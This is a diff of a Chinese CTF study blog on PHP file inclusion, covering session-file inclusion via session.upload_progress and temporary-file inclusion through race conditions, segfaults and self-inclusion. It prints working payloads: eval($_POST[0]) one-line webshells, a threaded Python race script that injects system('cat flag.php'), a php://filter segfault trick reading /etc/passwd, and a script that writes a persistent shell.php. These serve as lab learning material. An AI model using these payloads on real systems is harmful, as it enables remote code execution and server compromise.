+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_destroy();</span><br><span class="line">?&gt;</span><br><span class="line">// session_destroy() 将重置 session，将失去所有已存储的 session 数据。</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>把一个可控字符串（php恶意代码）写入session文件，然后包含session文件</p>
+<h2 id="漏洞分类"><a href="#漏洞分类" class="headerlink" title="漏洞分类"></a>漏洞分类</h2><h3 id="提供对session赋值的功能"><a href="#提供对session赋值的功能" class="headerlink" title="提供对session赋值的功能"></a>提供对session赋值的功能</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">if(isset($_GET[&#x27;a&#x27;]))&#123;</span><br><span class="line">    $a=$_GET[&#x27;a&#x27;];</span><br><span class="line">    $_SESSION[&#x27;username&#x27;]=$a;    </span><br><span class="line">&#125;</span><br><span class="line">var_dump($_SESSION);</span><br><span class="line">?&gt;</span><br><span class="line">//flag在根目录</span><br></pre></td></tr></table></figure>
+
+<p>上传一句话木马：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url/?a=&lt;?php echo 345;eval($_POST[0]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>在cookie中可以看到PHPSESSID，因此可以知道保存payload的文件名</p>
+<p><img src="https://s2.loli.net/2023/11/18/e4y2pTXnSbBxqjF.png" alt="image-20231024193152377"></p>
+<p>尝试默认保存目录，包含session文件</p>
+<p><img src="https://s2.loli.net/2023/11/18/jkc9v2zCLIe6htB.png" alt="image-20231024193718849"></p>
+<p>使用蚁剑连接，获取flag</p>
+<p><img src="https://s2.loli.net/2023/11/18/ip6MrloTe8hgbkX.png" alt="image-20231024193804739"></p>
+<h3 id="没有提供赋值功能"><a href="#没有提供赋值功能" class="headerlink" title="没有提供赋值功能"></a>没有提供赋值功能</h3><h4 id="session-upload-progress写入"><a href="#session-upload-progress写入" class="headerlink" title="session.upload_progress写入"></a><code>session.upload_progress</code>写入</h4><p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20231024194627329.png" alt="image-20231024194627329"></p>
+<h5 id="php配置"><a href="#php配置" class="headerlink" title="php配置"></a>php配置</h5><p>用<code>phpinfo()</code>查看</p>
+<p><img src="https://s2.loli.net/2023/11/18/LkCjMpXBFSJRQtu.png" alt="image-20231024194828661"></p>
+<p><code>session.upload_progress.enabled</code>：该选项开启（On）时，PHP可以监测文件上传的进度，这是客户端可以发送POST到服务端开查看上传进度，此时<code>session.upload_progress</code>生效</p>
+<p><code>session.upload_progress.cleanup</code>：该选项默认开启，读取POST请求后会删除上传进度信息。这时需要采用<strong>条件竞争</strong>的方法注入木马</p>
+<p>在文件上传过程中，客户端POST一个 <code>session.upload_progress.name</code> 的值同名的变量时，会在 <code>$_SESSION </code>数组中添加一组数据，索引是 <code>session.upload_progress.prefix</code> 与 <code>session.upload_progress.name</code> 拼接在一起的值。因此可以通过POST以 <code>session.upload_progress.name</code> 的值作为变量名的数据，变量值就是 <code>payload</code></p>
+<p><code>session.use_strict_mode</code>：默认关闭，改选项开启时，PHP不接受未初始化的会话id（就不能自己命名PHPSESSID）</p>
+<p><img src="https://s2.loli.net/2023/11/18/caAXuwxWNplgkfI.png" alt="image-20231024195321050"></p>
+<h5 id="实例及详解（session-upload-progress-cleanup为Off）"><a href="#实例及详解（session-upload-progress-cleanup为Off）" class="headerlink" title="实例及详解（session.upload_progress.cleanup为Off）"></a>实例及详解（<code>session.upload_progress.cleanup</code>为<code>Off</code>）</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form action=&quot;http://b.y1ng.vip:2007/&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">&lt;!--action的值为目标服务器地址 --&gt;</span><br><span class="line">        &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt; </span><br><span class="line">&lt;!-- name的值为phpinfo中参数session.upload_progress.name的值；value的值为payload--&gt;</span><br><span class="line">        &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>打开后发现是一个上传界面，开启burp代理，然后任意上传一个文件，burp抓包并发送到repeater模块</p>
+<p><img src="https://s2.loli.net/2023/11/18/jaE6izYLsHlbKxW.png" alt="image-20231024200836460"></p>
+<p>利用hackbar包含session文件</p>
+<p><img src="https://s2.loli.net/2023/11/18/2dPbruMC1mJsSo3.png" alt="image-20231024200921497"></p>
+<p>做题时，payload可以为：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="number">123</span>;@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">0</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="实例及详解（session-upload-progress-cleanup为On）"><a href="#实例及详解（session-upload-progress-cleanup为On）" class="headerlink" title="实例及详解（session.upload_progress.cleanup为On）"></a>实例及详解（<code>session.upload_progress.cleanup</code>为<code>On</code>）</h5><p>[WMCTF 2020]Make PHP Great Again</p>
+<h6 id="解法一：python脚本包含session"><a href="#解法一：python脚本包含session" class="headerlink" title="解法一：python脚本包含session"></a>解法一：python脚本包含session</h6><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">host = <span class="string">&#x27;http://1a4c15ee-2120-40e0-8fd8-f5738de3977b.node4.buuoj.cn:81/&#x27;</span></span><br><span class="line">sessid = <span class="string">&#x27;feng&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">POST</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">        session.post(</span><br><span class="line">            host,</span><br><span class="line">            data=&#123;<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>:<span class="string">&quot;&lt;?php system(&#x27;cat flag.php&#x27;);echo md5(&#x27;1&#x27;);?&gt;&quot;</span>&#125;,</span><br><span class="line">            files=&#123;<span class="string">&quot;file&quot;</span>:(<span class="string">&#x27;a.txt&#x27;</span>, f)&#125;,</span><br><span class="line">            cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:sessid&#125;</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">READ</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        response = session.get(<span class="string">f&#x27;<span class="subst">&#123;host&#125;</span>?file=/tmp/sess_<span class="subst">&#123;sessid&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="comment"># print(response.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;c4ca4238a0b923820dcc509a6f75849b&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[+++]retry&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(response.text)</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">    t1 = threading.Thread(target=POST, args=(session, ))</span><br><span class="line">    t1.daemon = <span class="literal">True</span></span><br><span class="line">    t1.start()</span><br><span class="line">    READ(session)</span><br></pre></td></tr></table></figure>
+
+<p>执行得flag</p>
+<p><img src="https://s2.loli.net/2023/11/18/z5tDdReJVqoXPwA.png" alt="image-20231030222311829"></p>
+<h6 id="解法二：html-爆破"><a href="#解法二：html-爆破" class="headerlink" title="解法二：html+爆破"></a>解法二：html+爆破</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#poc.php</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form action=&quot;http://1a4c15ee-2120-40e0-8fd8-f5738de3977b.node4.buuoj.cn:81/&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">&lt;!--action的值为目标服务器地址 --&gt;</span><br><span class="line">        &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;&lt;?php system(&#x27;cat /flag.php&#x27;);?&gt;&quot; /&gt; </span><br><span class="line">&lt;!-- name的值为phpinfo中参数session.upload_progress.name的值；value的值为payload--&gt;</span><br><span class="line">        &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">    session_start();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://s2.loli.net/2023/11/18/ZB8pTUqw3y5LOA9.png" alt="image-20231030223039080"></p>
+<p><img src="https://s2.loli.net/2023/11/18/rYBoZJX4lDItuzi.png" alt="image-20231030223644568"></p>
+<p><img src="https://s2.loli.net/2023/11/18/GHhTy6a1iJbujU5.png" alt="image-20231030223554025"></p>
+]]></content>
+      <categories>
+        <category>文件包含</category>
+      </categories>
+      <tags>
+        <tag>文件包含</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>文件包含学习记录</title>
     <url>/2024/03/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
     <content><![CDATA[<h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h2 id="认识是文件包含："><a href="#认识是文件包含：" class="headerlink" title="认识是文件包含："></a>认识是文件包含：</h2><p>通过<code>PHP</code>函数引入文件时，传入的文件名没有经过合理的验证，从而操作了预想之外的文件，就可能导致意外的文件泄漏甚至恶意代码注入。</p>
@@ -812,370 +1080,6 @@
       </tags>
   </entry>
   <entry>
-    <title>包含临时文件学习记录</title>
-    <url>/2024/03/09/%E5%8C%85%E5%90%AB%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6/</url>
-    <content><![CDATA[<h1 id="包含临时文件"><a href="#包含临时文件" class="headerlink" title="包含临时文件"></a>包含临时文件</h1><h2 id="php文件上传特性"><a href="#php文件上传特性" class="headerlink" title="php文件上传特性"></a>php文件上传特性</h2><p><img src="https://s2.loli.net/2023/11/18/5AgRPFiqI4KeX3a.png" alt="img"></p>
-<span id="more"></span>
-
-<p>php中上传文件，会创建临时文件，随机生成临时文件名（临时文件名为<code>php+6位[a-zA-Z0-9]</code>，比如<code>phpkx32ma</code>），将上传的内容写入临时文件后，关闭临时文件。在<code>linux</code>下保存在<code>/tmp</code>目录，而在<code>windows</code>下保存在<code>c:\winsdows\temp</code>目录。然后开始执行文件内程序，执行完后删除。因此，可以上传包含payload的恶意文件，在文件被删除前（作为临时文件）包含该文件，可以实现利用。</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"><span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] </span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">    <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>配合<code>phpinfo</code>页面的<code>php variables</code>，可以直接获取到上传文件的存储路径和临时文件名</p>
-<p><img src="https://s2.loli.net/2023/11/18/YWsGoH6aLJiC2Uc.png" alt="image-20231025142053342"></p>
-<h2 id="包含方式"><a href="#包含方式" class="headerlink" title="包含方式"></a>包含方式</h2><p>临时文件转瞬即逝，如何在短时间内包含它？</p>
-<h3 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h3><p>条件竞争就是一直上传文件，同时一直去包含临时文件，竞争一下是先包含还是先删除。</p>
-<h3 id="段错误"><a href="#段错误" class="headerlink" title="段错误"></a>段错误</h3><p>所谓的段错误（segment fault）就是指访问的内存超过了系统所给这个程序的内存空间。从而发生程序退出，临时文件就不会被删除。</p>
-<p>在php7中</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">file=php:<span class="comment">//filter/string.strip_tags=/etc/passwd</span></span><br></pre></td></tr></table></figure>
-
-<p>会造成段错误。 </p>
-<p>适用版本： </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php7.0.0-7.1.2可以利用， 7.1.2x版本的已被修复</span><br><span class="line">php7.1.3-7.2.1可以利用， 7.2.1x版本的已被修复</span><br><span class="line">php7.2.2-7.2.8可以利用， 7.2.9一直到7.3到现在的版本已被修复</span><br></pre></td></tr></table></figure>
-
-<h4 id="实列及详解"><a href="#实列及详解" class="headerlink" title="实列及详解"></a>实列及详解</h4><p>查看网页源代码，发现提示信息</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username/password error&lt;html&gt;</span><br><span class="line">&lt;!--md5($secret.$name)===$pass --&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-
-<p>传递name参数，用burp抓包并发送到repeater模块</p>
-<p><img src="https://s2.loli.net/2023/11/18/y9SgG3NDnjQacIB.png" alt="image-20231025161936687"></p>
-<p><img src="https://s2.loli.net/2023/11/18/oQL6JwPxvsfSk4a.png" alt="image-20231025161900649"></p>
-<p>经过测试，发现改变name的值，响应包中Hash值会响应改变（name和hash一一对应），结合提示，可以传入pass参数，值为响应包中的Hash值（name值和pass值要相对应）。</p>
-<p><img src="https://s2.loli.net/2023/11/18/IDOkeyP7MNYGdKZ.png" alt="image-20231025162123175"></p>
-<p>在响应包中发现提示文件：<code>flflflflag.php</code>，访问该文件</p>
-<p><img src="https://s2.loli.net/2023/11/18/mxInGt6O72psNyY.png" alt="image-20231025162404641"></p>
-<p>发现文件包含，猜测可能是文件包含漏洞，可以查看源码</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/flflflflag.php?file=php://filter/read=convert.base64-encode/resource=flflflflag.php</span><br></pre></td></tr></table></figure>
-
-<p>用BurpSuite拦截响应，base64解码后得到源码：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;script language=&quot;javascript&quot; type=&quot;text/javascript&quot;&gt;</span><br><span class="line">           window.location.href=&quot;404.html&quot;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;this_is_not_fl4g_and_出题人_wants_girlfriend&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">$file=$_GET[&#x27;file&#x27;];</span><br><span class="line">if(preg_match(&#x27;/data|input|zip/is&#x27;,$file))&#123;</span><br><span class="line">	die(&#x27;nonono&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">@include($file);</span><br><span class="line">echo &#x27;include($_GET[&quot;file&quot;])&#x27;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-
-<p>利用目录扫描：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python dirsearch.py -u http://c7e65748-3412-4257-9224-6c01808f5a20.node4.buuoj.cn:81/</span><br></pre></td></tr></table></figure>
-
-<p>扫描发现dir.php。</p>
-<p><img src="https://s2.loli.net/2023/11/18/ruxOEn2CovHcR5U.png" alt="image-20231025165147270"></p>
-<p><img src="https://s2.loli.net/2023/11/18/ULTyQMfe9zqj4VW.png" alt="image-20231025165242501"></p>
-<p>访问dir.php文件：</p>
-<p><img src="https://s2.loli.net/2023/11/18/o7rUlwePmHFVIqA.png" alt="image-20231025163132883"></p>
-<p>查看dir.php源代码：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/flflflflag.php?file=php://filter/read=convert.base64-encode/resource=dir.php</span><br></pre></td></tr></table></figure>
-
-<p>用Burpsuite拦截响应，base64解码后源代码：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;/tmp&#x27;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>dir.php能打印临时文件夹里的内容，因此我们要想办法把文件存到tmp文件夹中。</p>
-<p>该题存在文件包含，而且可以显示临时文件夹（&#x2F;tmp）的内容，因此可以考虑临时文件包含的方法解题。同时，根据响应包中内容：<code>X-Powered-By: PHP/7.0.33</code>，说明php版本存在段错误。</p>
-<p>编写python脚本</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=gbk</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO </span><br><span class="line"><span class="comment">#BytesIO实现了在内存中读写bytes</span></span><br><span class="line">payload = <span class="string">&quot;&lt;?php phpinfo();?&gt;&quot;</span> </span><br><span class="line"><span class="comment">#注入的恶意命令</span></span><br><span class="line"><span class="comment">#payload=&quot;&lt;?php echo 12;fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php echo 1234;eval($_POST[0]);?&gt;&#x27;);?&gt;&quot; </span></span><br><span class="line"><span class="comment">#把一句话木马写入shell.php</span></span><br><span class="line">data=&#123;<span class="string">&#x27;file&#x27;</span>: BytesIO(payload.encode())&#125;</span><br><span class="line">url=<span class="string">&quot;http://c7e65748-3412-4257-9224-6c01808f5a20.node4.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&quot;</span></span><br><span class="line">r=requests.post(url=url,files=data,allow_redirects=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>
-
-<p>执行该脚本后，payload就注入到临时文件了。</p>
-<p>再次访问dir.php文件，得到tmp目录下刚刚我们上传的文件路径：&#x2F;tmp&#x2F;phpVvvefu</p>
-<p><img src="https://s2.loli.net/2023/11/18/jymveQM7NRstuDc.png" alt="image-20231025164408642"></p>
-<p>利用BurpSuite发送请求，由于本题的flag在<code>phpinfo()</code>中，因此这样就能得到flag：</p>
-<p><img src="https://s2.loli.net/2023/11/18/d5BhRK1X6Tgta9m.png" alt="image-20231025164751449"></p>
-<h3 id="自包含"><a href="#自包含" class="headerlink" title="自包含"></a>自包含</h3><p>自己包含自己，进入死循环，脚本永不结束，也就不会删除临时文件。</p>
-<p>文件上传，phpinfo，自包含三者缺一不可，在同一个页面发生。</p>
-<p>题目网址：<a href="http://b.y1ng.vip:2039/%EF%BC%88%E5%B7%B2%E5%A4%B1%E6%95%88%EF%BC%89">http://b.y1ng.vip:2039/（已失效）</a></p>
-<p>题目源码（文件位于<code>index.php</code>）</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;info&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$page</span> = <span class="string">&#x27;/var/www/html/&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$page</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
-
-<p>如果将<code>page</code>赋值为<code>index.php</code>，就会开始自包含。</p>
-<p>然后对死循环发送POST请求，此时POST请求对应的临时文件才不会被清理。</p>
-<p>创建上传表单（<code>untitled.html</code>）：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=&quot;http://b.y1ng.vip:2039/?page=index.php&amp;info&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">&lt;!--action的值为目标服务器地址 --&gt; </span><br><span class="line">&lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-
-<p>创建上传文件（<code>1.txt</code>）：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&#x27;123&#x27;</span>); </span><br><span class="line">    <span class="comment"># 123用于检查是否上传成功</span></span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;/tmp/shell.php&#x27;</span>, <span class="string">&#x27;&lt;?php echo(&#x27;</span><span class="number">1234</span><span class="string">&#x27;); eval($_POST[0]);?&gt;&#x27;</span>);</span><br><span class="line">    <span class="comment"># 1234用于检查是否执行成功</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>注意，如果循环次数过多会导致电脑死机，所以不建议长时间循环，最好的方式是包含后就生成一个永久的shell，一包含到就可以结束自包含。</p>
-<p>打开上传表单：</p>
-<p><img src="https://s2.loli.net/2023/11/18/2CguitUDP35bB9s.png" alt="image-20231025193909257"></p>
-<p>上传成功后找到路径</p>
-<p><img src="https://s2.loli.net/2023/11/18/uSEZL1jxi2TqfCM.png" alt="image-20231025195150883"></p>
-<p>包含</p>
-<p><img src="https://s2.loli.net/2023/11/18/8hvtMaESITi7Jd4.png" alt="image-20231025195241303"></p>
-<p>输出123表示1.txt文件上传成功</p>
-<p>关闭循环，找到木马文件路径</p>
-<p><img src="https://s2.loli.net/2023/11/18/nUJworM2IdKe4Eu.png" alt="image-20231025195421339"></p>
-<p>输出1234表示一句话木马执行成功。接下来连蚁剑，找flag。</p>
-]]></content>
-      <categories>
-        <category>文件包含</category>
-      </categories>
-      <tags>
-        <tag>文件包含</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>包含session文件学习记录</title>
-    <url>/2024/03/09/%E5%8C%85%E5%90%ABsession%E6%96%87%E4%BB%B6/</url>
-    <content><![CDATA[<h1 id="PHP-session包含"><a href="#PHP-session包含" class="headerlink" title="PHP session包含"></a>PHP session包含</h1><h2 id="什么是PHP-session"><a href="#什么是PHP-session" class="headerlink" title="什么是PHP session"></a>什么是PHP session</h2><p>PHP session 变量用于存储关于用户会话（session）的信息，或者更改用户会话（session）的设置。Session 变量存储单一用户的信息，并且对于应用程序中的所有页面都是可用的。</p>
-<span id="more"></span>
-
-<h3 id="PHP-session-变量"><a href="#PHP-session-变量" class="headerlink" title="PHP session 变量"></a>PHP session 变量</h3><p>您在计算机上操作某个应用程序时，您打开它，做些更改，然后关闭它。这很像一次对话（Session）。计算机知道您是谁。它清楚您在何时打开和关闭应用程序。然而，在因特网上问题出现了：由于 HTTP 地址无法保持状态，Web 服务器并不知道您是谁以及您做了什么。</p>
-<p>PHP session 解决了这个问题，它通过在服务器上存储用户信息以便随后使用（比如用户名称、购买商品等）。然而，会话信息是临时的，在用户离开网站后将被删除。如果您需要永久存储信息，可以把数据存储在数据库中。</p>
-<p>Session 的工作机制是：为每个访客创建一个唯一的 id (UID)，并基于这个 UID 来存储变量。UID 存储在 cookie 中，或者通过 URL 进行传导。</p>
-<h3 id="开始-PHP-session"><a href="#开始-PHP-session" class="headerlink" title="开始 PHP session"></a>开始 PHP session</h3><p>在您把用户信息存储到 PHP session 中之前，首先必须启动会话。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php session_start(); ?&gt;</span><br><span class="line"> </span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"> </span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-
-<p>上面的代码会向服务器注册用户的会话，以便您可以开始保存用户信息，同时会为用户会话分配一个 UID。</p>
-<h3 id="存储-session-变量"><a href="#存储-session-变量" class="headerlink" title="存储 session 变量"></a>存储 session 变量</h3><p>session是一个数组，有键和值：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]=<span class="string">&#x27;admin&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<p>其中，<code>username</code>是键，<code>admin</code>是值</p>
-<p>存储和取回 session 变量的正确方法是使用 PHP <code>$_SESSION</code> 变量：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">// 存储 session 数据</span><br><span class="line">$_SESSION[&#x27;views&#x27;]=1;</span><br><span class="line">?&gt;</span><br><span class="line"> </span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;title&gt;菜鸟教程(runoob.com)&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"> </span><br><span class="line">&lt;?php</span><br><span class="line">// 检索 session 数据</span><br><span class="line">echo &quot;浏览量：&quot;. $_SESSION[&#x27;views&#x27;];</span><br><span class="line">?&gt;</span><br><span class="line"> </span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">// 浏览量：1</span><br></pre></td></tr></table></figure>
-
-<p>在下面的实例中，我们创建了一个简单的 <code>page-view</code> 计数器。<code>isset() </code>函数检测是否已设置 “<code>views</code>“ 变量。如果已设置 “<code>views</code>“ 变量，我们累加计数器。如果 “<code>views</code>“ 不存在，则创建 “<code>views</code>“ 变量，并把它设置为 <code>1</code>：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line"> </span><br><span class="line">if(isset($_SESSION[&#x27;views&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">    $_SESSION[&#x27;views&#x27;]=$_SESSION[&#x27;views&#x27;]+1;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    $_SESSION[&#x27;views&#x27;]=1;</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;浏览量：&quot;. $_SESSION[&#x27;views&#x27;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<h3 id="session变量存储地址"><a href="#session变量存储地址" class="headerlink" title="session变量存储地址"></a>session变量存储地址</h3><p>查看<code>session.save_path</code></p>
-<table>
-<thead>
-<tr>
-<th>Directive</th>
-<th>Local Value</th>
-<th>Master Value</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>session.save_path</td>
-<td>no value</td>
-<td>no value</td>
-</tr>
-</tbody></table>
-<p><code>session.save_path</code>为<code>no value</code>则表示存储在默认的<code>/tmp</code>或<code>/var/lib/php/session</code>目录下</p>
-<p>反之则会标明详细路径	</p>
-<h3 id="存放session变量文件名"><a href="#存放session变量文件名" class="headerlink" title="存放session变量文件名"></a>存放session变量文件名</h3> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sess_[phpsessid]</span><br></pre></td></tr></table></figure>
-
-<p> phpsessid 在发送的请求的 <code>cookie</code> 字段中可以看到（保存在<code>cookie</code>里面，专门标识session）</p>
